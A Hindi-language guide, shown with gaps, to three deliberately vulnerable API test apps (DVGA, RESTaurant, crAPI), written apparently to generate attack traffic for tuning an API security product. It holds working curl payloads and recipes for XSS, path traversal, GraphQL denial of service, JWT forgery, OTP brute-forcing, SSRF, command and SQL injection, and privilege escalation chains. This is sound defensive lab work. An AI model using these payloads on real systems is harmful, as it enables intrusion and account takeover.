...
यह गाइड तीन API सुरक्षा परीक्षण अनुप्रयोगों में प्रत्येक API एंडपॉइंट, जानबूझकर रखी गई भेद्यता, और अटैक पेलोड का कैटलॉग प्रस्तुत करती है। F5 XC API सुरक्षा प्रोफ़ाइल विकास के लिए ट्रैफ़िक जनरेशन पैटर्न बनाने हेतु इसका उपयोग करें।
...
**एडमिन क्रेडेंशियल्स:** admin / password

सभी DVGA इंटरैक्शन एक ही एंडपॉइंट (`/dvga/graphql`) का उपयोग करते हैं, जिसमें JSON `{"query":"..."}` पेलोड वाले POST रिक्वेस्ट भेजे जाते हैं।
...
| `me(token)` | Query | नहीं | JWT द्वारा उपयोगकर्ता प्राप्त करें (फोर्जरी के लिए असुरक्षित) |
...
| `uploadPaste(filename, content)` | Mutation | नहीं | पेस्ट अपलोड करें (पाथ ट्रैवर्सल) |

### भेद्यता कैटलॉग

#### 1. सेवा अस्वीकरण (6 परिदृश्य)
...
**गहन रिकर्सन (सर्कुलर Owner/Paste संदर्भ):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**फ़ील्ड डुप्लिकेशन (फ़ील्ड को 500+ बार दोहराएँ):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**इंट्रोस्पेक्शन (संपूर्ण स्कीमा गणना):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**createPaste के माध्यम से संग्रहीत XSS:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**uploadPaste के माध्यम से मनमानी फ़ाइल लेखन (पाथ ट्रैवर्सल):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
| `/restaurant/token` | POST | नहीं | — | कमजोर सीक्रेट (97952) के साथ JWT |
...
| `/restaurant/users/update_role` | PUT | हाँ | कोई भी | **BFLA** (भूमिका एस्केलेशन) |
| `/restaurant/menu` | GET | हाँ | कोई भी | मेन्यू आइटम सूची |
| `/restaurant/menu` | PUT | हाँ | Employee+ | मेन्यू बनाएँ (इमेज के माध्यम से **SSRF**) |
| `/restaurant/menu/{item_id}` | PUT | हाँ | Employee+ | मेन्यू अपडेट करें (इमेज के माध्यम से **SSRF**) |
...
#### API1:2023 — टूटा हुआ ऑब्जेक्ट लेवल प्राधिकरण (BOLA)
...
**अन्य उपयोगकर्ताओं के ऑर्डर एक्सेस करें (ऑफसेट एन्यूमरेट करें):**
```bash
...
**JWT कमजोर सीक्रेट ब्रूट-फोर्स (सीक्रेट 6 अंकों का है: 97952):**
```bash
# jwt.io पर टोकन डीकोड और फोर्ज करें
# Secret: 97952 (hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' से ब्रूट-फोर्स योग्य)

# Chef टोकन फोर्ज करें:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# सीक्रेट 97952 से साइन करें
```

#### API3:2023 — टूटा हुआ ऑब्जेक्ट प्रॉपर्टी लेवल प्राधिकरण (BOPLA)
...
**एस्केलेशन पथ: Customer → Employee → Chef:**
```bash
# चरण 1: Employee तक एस्केलेट करें
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Employee"}'

# चरण 2: Chef तक एस्केलेट करें
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
...
#### API5:2023 — टूटा हुआ फंक्शन लेवल प्राधिकरण (BFLA)

**Customer के रूप में मेन्यू आइटम हटाएँ (Employee+ आवश्यक होना चाहिए):**
```bash
...
**मेन्यू image_url के माध्यम से आंतरिक एंडपॉइंट की जाँच करें (Employee भूमिका आवश्यक):**
```bash
# पहले BOPLA के माध्यम से Employee तक एस्केलेट करें, फिर:
...
# 3. Chef तक एस्केलेट करें (BOPLA)
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'

# 4. Chef-लेवल टोकन प्राप्त करने के लिए पुनः प्रमाणीकरण करें
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
...
**प्रमाणीकरण:** JWT Bearer टोकन (RS256, एल्गोरिथम कन्फ्यूज़न के लिए असुरक्षित)
...
| `/identity/api/auth/login` | POST | नहीं | JWT टोकन (एल्गोरिथम कन्फ्यूज़न) |
| `/identity/api/auth/forget-password` | POST | नहीं | OTP अनुरोध |
| `/identity/api/auth/v2/check-otp` | POST | नहीं | **कोई रेट लिमिट नहीं** (4-अंकीय OTP ब्रूट-फोर्स) |
...
| `/workshop/api/mechanic/mechanic_report` | GET | नहीं | **BOLA** (कोई प्रमाणीकरण नहीं, क्रमिक ID) |
...
#### चैलेंज 1 — BOLA: किसी अन्य उपयोगकर्ता के वाहन का स्थान एक्सेस करें
...
# किसी अन्य उपयोगकर्ता के वाहन को एक्सेस करें (UUID बदलें)
curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
  -H "Authorization: Bearer ${TOKEN}"
```

#### चैलेंज 2 — BOLA: मैकेनिक रिपोर्ट एक्सेस करें (कोई प्रमाणीकरण नहीं)

```bash
# क्रमिक ID एन्यूमरेशन — कोई टोकन आवश्यक नहीं
for i in 1 2 3 4 5; do
  echo "Report $i:"
...
#### चैलेंज 3 — टूटा हुआ प्रमाणीकरण: पासवर्ड रीसेट OTP ब्रूट-फोर्स
...
# 4-अंकीय OTP ब्रूट-फोर्स (v2 में कोई रेट लिमिटिंग नहीं)
...
#### चैलेंज 5 — डेटा एक्सपोज़र: आंतरिक वीडियो कन्वर्ज़न पैरामीटर

```bash
# एक वीडियो अपलोड करें, फिर प्रतिक्रिया का निरीक्षण करें
curl -sf ${CRAPI}/identity/api/v2/user/videos \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
# प्रतिक्रिया में conversion_params फ़ील्ड देखें
```

#### चैलेंज 6 — सेवा अस्वीकरण: Contact Mechanic के माध्यम से लेयर 7
...
```bash
# सामान्य उपयोगकर्ता एडमिन एंडपॉइंट एक्सेस कर सकता है
curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
  -H "Authorization: Bearer ${TOKEN}"
```

#### चैलेंज 8 और 9 — मास असाइनमेंट: ऑर्डर हेरफेर द्वारा मुफ्त आइटम
...
#### चैलेंज 10 — वीडियो कन्वर्ज़न पैरामीटर के माध्यम से कमांड इंजेक्शन
...
#### चैलेंज 11 — Contact Mechanic के माध्यम से SSRF
...
#### चैलेंज 13 — SQL इंजेक्शन: कूपन कई बार रिडीम करें
...
#### चैलेंज 14 — अप्रमाणित ऑर्डर एक्सेस
...
#### चैलेंज 15 — JWT एल्गोरिथम कन्फ्यूज़न

```bash
# "none" एल्गोरिथम के साथ JWT फोर्ज करें (कोई हस्ताक्षर सत्यापन नहीं):
...
| **API2: टूटा हुआ प्रमाणीकरण** | JWT फोर्जरी (`me` क्वेरी) | JWT कमजोर सीक्रेट (97952) | OTP ब्रूट-फोर्स (v2), JWT एल्गोरिथम कन्फ्यूज़न |
| **API3: BOPLA** | — | `PATCH /profile` (भूमिका एस्केलेशन) | वीडियो conversion_params, मैकेनिक ईमेल एक्सपोज़र |
| **API4: संसाधन खपत** | बैच, रिकर्सन, एलियास, फ़ील्ड डुप्लिकेशन DoS | प्रतिक्रिया लंबाई द्वारा उपयोगकर्ता एन्यूमरेशन | `contact_mechanic` repeat_request DoS |
...
| **API10: असुरक्षित खपत** | — | — | (SSRF के माध्यम से अप्रत्यक्ष) |
| **GraphQL-विशिष्ट** | इंट्रोस्पेक्शन, बैचिंग, रिकर्सन, एलियास, फ़ील्ड डुप्लिकेशन, सर्कुलर फ्रैगमेंट | — | — |

---

## ट्रैफ़िक जनरेशन पैटर्न

### चरण 1: बेसलाइन (सामान्य पथ)
...
**BOLA परीक्षण:** क्रमिक ID एन्यूमरेट करें, रिक्वेस्ट में उपयोगकर्ता पहचानकर्ता बदलें, स्वामित्व के बिना संसाधन एक्सेस करें।

**इंजेक्शन परीक्षण:** filter/coupon पैरामीटर में SQL पेलोड, GraphQL क्वेरी इंजेक्शन, पैरामीटर फ़ील्ड के माध्यम से OS कमांड इंजेक्शन।

**प्रमाणीकरण बाईपास परीक्षण:** JWT टोकन फोर्ज करें, OTP ब्रूट-फोर्स करें, पुराने API संस्करण का उपयोग करें, एल्गोरिथम कन्फ्यूज़न।

**SSRF परीक्षण:** `importPaste`, `image_url`, और `mechanic_api` पैरामीटर में आंतरिक URL।

**DoS परीक्षण:** GraphQL बैच/रिकर्सन/एलियास अटैक, उच्च काउंट के साथ `repeat_request_if_failed`।

### चरण 3: स्टेटफुल अटैक चेन

कुछ अटैक के लिए स्टेट के साथ बहु-चरणीय अनुक्रम आवश्यक हैं:

1. **RESTaurant एस्केलेशन चेन:** पंजीकरण → टोकन → Chef तक PATCH भूमिका → पुनः प्रमाणीकरण → कमांड इंजेक्शन
2. **crAPI पूर्ण प्रवाह:** साइनअप → ईमेल सत्यापन (MailHog) → लॉगिन → वाहन जोड़ें → Contact mechanic (SSRF) → ऑर्डर हेरफेर
3. **DVGA रीकॉन-टू-एक्सप्लॉइट:** इंट्रोस्पेक्शन → systemDiagnostics खोजें → एडमिन क्रेडेंशियल्स ब्रूट-फोर्स → OS कमांड निष्पादन

### दर अनुशंसाएँ

| पैटर्न | रिक्वेस्ट/सेकंड | अवधि | नोट्स |
|---|---|---|---|
| बेसलाइन (प्रति ऐप) | 10-50 | 5 मिनट | सामान्य ट्रैफ़िक फिंगरप्रिंट स्थापित करें |
| BOLA एन्यूमरेशन | 100-500 | 2 मिनट | क्रमिक ID स्कैनिंग |
| OTP ब्रूट-फोर्स | 1000+ | मिलने तक | अधिकतम 10,000 प्रयास (4-अंकीय) |
| GraphQL DoS | 10-50 | 30 सेकंड | प्रत्येक रिक्वेस्ट सर्वर-साइड पर महंगी है |
| इंजेक्शन फ़ज़िंग | 50-200 | 5 मिनट | प्रति रिक्वेस्ट पेलोड बदलें |
| SSRF प्रोबिंग | 5-20 | 2 मिनट | धीमी; प्रत्येक सर्वर-साइड HTTP रिक्वेस्ट ट्रिगर करती है |
